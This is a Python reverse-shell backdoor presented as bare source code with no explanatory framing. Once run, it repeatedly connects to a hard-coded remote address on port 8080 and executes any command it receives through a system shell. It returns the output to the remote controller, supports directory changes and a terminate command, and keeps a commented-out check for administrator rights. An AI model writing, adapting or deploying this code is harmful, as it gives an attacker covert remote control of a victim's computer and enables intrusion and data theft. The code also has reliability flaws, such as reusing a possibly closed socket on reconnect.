import socket
import subprocess
import os
import time


def tune_connection():
    s = socket.socket()
    while True:
        time.sleep(10)
        try:
            s.connect(("10.3.131.241", 8080))
            shell(s)

        except:
            tune_connection()

def shell(s):
    while True:
        command = s.recv(5000)
        if 'terminate' in command.decode():
            try:
                s.close()
                break
            except Exception as e:
                inform_to_server = "[+] Some Error Occurred" + str(e)
                s.send(inform_to_server.encode())
                break

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                inform_to_server = "[+] Current working directory is " + os.getcwd()
                s.send(inform_to_server.encode())
            except Exception as e:
                inform_to_server = "[+] Some error occured. " + str(e)
                s.send(inform_to_server.encode())


        # elif 'checkUserLevel' in command.decode():
        #     try:
        #         admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith("win") else os.geteuid() == 0
        #         perms = "[+] Administrator Privileges." if admin else "[!!] User Privileges. (No Admin privileges)"
        #         s.send(perms.encode())
        #     except Exception as e:
        #         s.send(f"[+] Some error occurred: {str(e)}".encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

            # send back the result
            s.send(CMD.stdout.read())

            # send back the error -if any-, such as syntax error
            s.send(CMD.stderr.read())

def main():
        tune_connection()
main()